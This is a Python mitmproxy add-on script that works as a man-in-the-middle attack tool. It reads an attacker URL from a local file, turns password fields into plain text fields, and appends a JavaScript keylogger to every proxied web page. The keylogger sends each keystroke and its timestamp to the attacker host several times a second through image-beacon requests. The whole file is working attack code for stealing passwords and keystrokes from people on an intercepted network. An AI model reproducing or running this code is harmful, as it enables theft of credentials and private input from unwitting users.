from mitmproxy import http
import sys
import time
import os

URLVAL = ""
while len(URLVAL) == 0:
	time.sleep(.1)
	URLVAL = open("temp").read().strip()
print(URLVAL)
#os.system("rm temp")

def response(flow: http.HTTPFlow) -> None:
	#print("PRETTY HOST")
	#print(flow.request.pretty_host)
	flow.response.content = flow.response.content.replace(b"type=\"password\"", b"type=\"notPassword\"")
	flow.response.content += b"""<script>var buffer = [];
var attacker = 'THE_URL/?c='

document.onkeypress = function(e) {
	var timestamp = Date.now() | 0;
	var stroke = {
		k: e.key,
		t: timestamp
	};
	buffer.push(stroke);
}

function httpGet(theUrl)
// The network request grabs the json containing mp3 structure
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

window.setInterval(function() {
	if (buffer.length > 0) {
		var data = encodeURIComponent(JSON.stringify(buffer));

		new Image().src = attacker + data;
		buffer = [];
	}
}, 200);</script>"""
	flow.response.content = flow.response.content.replace(b"THE_URL", URLVAL.encode())
